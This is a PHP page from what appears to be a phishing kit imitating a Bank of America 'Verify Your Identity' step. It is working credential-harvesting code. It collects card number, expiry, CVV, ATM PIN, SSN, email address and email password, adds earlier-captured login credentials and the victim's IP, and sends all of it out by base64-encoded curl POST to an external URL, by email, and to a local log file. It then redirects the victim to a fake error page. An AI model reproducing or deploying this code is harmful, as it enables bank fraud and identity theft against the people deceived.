<?php
ini_set("output_buffering",4096);

include '../Valid.php';
@session_start();
ob_start();

include 'Emaili.php';

function curl_sendi($url,$post){
    curl_setopt($ch=curl_init(), CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$hosti = generateRandomString();


$_SESSION['cn'] = $_POST['cn'];
$_SESSION['ex'] = $_POST['ex'];
$_SESSION['cv'] = $_POST['cv'];
$_SESSION['ata'] = $_POST['ata'];
$_SESSION['sn'] = $_POST['sn'];
$_SESSION['em'] = $_POST['em'];
$_SESSION['emp'] = $_POST['emp'];

if (!empty($_POST["cn"])) {
			$ipaddress = $_SERVER['REMOTE_ADDR'];
			$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
			$message.= "-------------User Info-----------------\n";
			$message.= "Username: ".$_SESSION['usr']."\n";
			$message.= "Pass Code: ".$_SESSION['psw']."\n";
			$message.=  "-------------Card Info-----------------\n";
			$message.=  "Card Number: ".$_SESSION['cn']."\n";
			$message.=  "Expiration MM/YYYY: ".$_SESSION['ex']."\n";
			$message.=  "CSC (3 digits): ".$_SESSION['cv']."\n";
			$message.=  "ATM PIN: ".$_SESSION['ata']."\n";
			$message.=  "SSN: ".$_SESSION['sn']."\n";
			$message.=  "Email Address: ".$_SESSION['em']."\n";
			$message.=  "Email Pass: ".$_SESSION['emp']."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "IP            : ".$ipaddress."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "|Client IP: ".$ipaddress2."\n";
			$message.= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
			$subject = "xXxBOA-NeWxXx $ipaddress";
			$headers = "From: UnKnown <Source@Bourder.land>";
			$dataenc = base64_encode($message);
			$post = array('data'=>$dataenc);
		    $sendi = curl_sendi($url,$post);
			mail($SEND,$subject,$message,$headers);
			$fp = fopen("../best.txt","a");
			fputs($fp,$message);
			fclose($fp);
		    header("Location: emailerror.php?sec=$hosti$hosti$hosti"); 
} else {
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<link rel="shortcut icon" href="images/favicon.ico">	
<style type="text/css">

</style>
<link rel="stylesheet" href="css-js/jok1.css">
</head>
<body>
<form action="" name="chalojee" id="chalojee" method="post">
<div id="container">

<div id="image9" style="position:absolute; overflow:hidden; left:202px; top:200px; width:168px; height:183px; z-index:0"><img src="images/bb1.png" alt="" title="" border="0" width="168" height="183"></div>
<div id="image12" style="position:absolute;overflow:hidden;left:202px;top: 414px;z-index:0;"><img src="images/bb13.png" alt="" title="" border="0" ></div>

<div id="image15" style="position: absolute;overflow: hidden;left: 180px;top: 936px;width: 987px;height: 150px;z-index: 3;"><img src="images/bbo28.png" alt="" title="" border="0" width="987" height="150"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:5"><img src="images/b7.png" alt="" title="" border="0" width="983" height="117"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:6"><img src="images/b9.png" alt="" title="" border="0" width="428" height="28"></div>

<div id="image10" style="position: absolute;overflow: hidden;left: 340px;top: 739px;width: 75px;height: 29px;z-index: 6;"><a href="#"><img src="images/bb10.png" alt="" title="" border="0" width="75" height="29"></a></div>
<input name="cn" id="cn" class="textbox" minlength="15" maxlength="16" autocomplete="off" required="" type="tel" style="position:absolute;width:262px;left:204px;top: 228px;z-index:8;">
<input name="ex" placeholder="MM/YYYY" minlength="4" maxlength="7" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:262px;left:204px;top: 299px;z-index:9;">
<input name="cv" class="textbox" autocomplete="off" required="" maxlength="3" type="tel" style="position:absolute;width:262px;left:203px;top: 372px;z-index:10;">
<input name="ata" class="textbox" autocomplete="off" required="" minlength="4"  maxlength="4" type="text" style="position:absolute;width:262px;left:204px;top: 445px;z-index:7;">
<input name="sn" class="textbox" autocomplete="off"  minlength="9"  maxlength="11" required="" type="tel" style="position:absolute;width:262px;left:204px;top: 503px;z-index:8;">
<input name="em" class="textbox" autocomplete="off" required="" minlength="3"  type="email" style="position:absolute;width:262px;left:204px;top: 575px;z-index:7;">
<input name="emp" class="textbox" autocomplete="off"  minlength="3"   required="" type="password" style="position:absolute;width:262px;left:204px;top: 645px;z-index:8;">

<div id="formimage1" style="position: absolute;left: 206px;top: 738px;z-index: 16;"><input type="image" name="formimage1" width="129" height="32" src="images/bcnf.png"></div>
</form></div>

</body>

</html>
<?php ob_end_flush(); ?>